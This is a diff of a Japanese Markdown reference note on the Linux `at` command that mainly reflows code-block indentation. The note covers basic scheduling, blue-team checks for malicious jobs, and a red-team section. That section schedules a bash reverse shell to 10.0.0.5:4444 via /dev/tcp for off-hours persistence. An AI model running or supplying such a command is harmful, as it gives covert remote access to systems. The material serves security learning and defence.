@@ -5,7 +5,7 @@ tags:
   - systemd-run
   - sleep
 created: 2025-06-29 15:02
-modified: 2026-01-18 14:35
+modified: 2026-01-18 15:02
 environment:
   - OS/Linux
 vulnearability: []
@@ -39,13 +39,12 @@ knowledge_category: Command
 * **解説**: 実行したいコマンドが複雑な場合は、スクリプトファイルとして保存し、`-f` オプションでそのファイルを指定するのが確実で管理しやすくなります。
 * **コマンド例**:
 
-		```bash
-    # /opt/scripts/backup.sh というバックアップスクリプトを予約
+```bash
+# /opt/scripts/backup.sh というバックアップスクリプトを予約
 
-    at -f /opt/scripts/backup.sh 1am next monday
+at -f /opt/scripts/backup.sh 1am next monday
 
-    ```
-
+```
 
 ## オプション説明
 
@@ -69,13 +68,12 @@ knowledge_category: Command
 * **解説**: `echo` とパイプを使い、単一のコマンドを指定した時刻に実行予約する、最も手軽で基本的な使い方です。
 * **例**:
 
-		```bash
-    # 今晩23:30にシステムをシャットダウン
+```bash
+# 今晩23:30にシステムをシャットダウン
 
-    echo "sudo shutdown -h now" | at 23:30
+echo "sudo shutdown -h now" | at 23:30
 
-    ```
-
+```
 
 ### 2. ブルーチーム視点
 
@@ -84,17 +82,16 @@ knowledge_category: Command
 * **解説**: 攻撃者が永続化のために `at` ジョブを仕掛けていないか調査します。`atq` で不審なユーザーによるジョブを見つけ、`at -c` でその具体的なコマンドを確認します。
 * **例**:
 
-		```bash
-    # 全ユーザーのatジョブをリストアップ
+```bash
+# 全ユーザーのatジョブをリストアップ
 
-    atq
+atq
 
-    # 不審なジョブID 15 の内容を確認
+# 不審なジョブID 15 の内容を確認
 
-    at -c 15
+at -c 15
 
-    ```
-
+```
 
 ### 3. レッドチーム視点
 
@@ -103,13 +100,12 @@ knowledge_category: Command
 * **解説**: `cron` ほど頻繁に監視されていない可能性がある `at` を利用して、検知を逃れつつ、ブルーチームの活動時間外（深夜など）に再度侵入するための足がかりを仕掛けます。
 * **例**:
 
-		```bash
-    # 翌日の午前2時に自分のサーバ(10.0.0.5:4444)へリバースシェルを接続させる
+```bash
+# 翌日の午前2時に自分のサーバ(10.0.0.5:4444)へリバースシェルを接続させる
 
-    echo "bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'" | at 2am tomorrow
+echo "bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'" | at 2am tomorrow
 
-    ```
-
+```
 
 ## エラーメッセージとトラブルシューティング
 
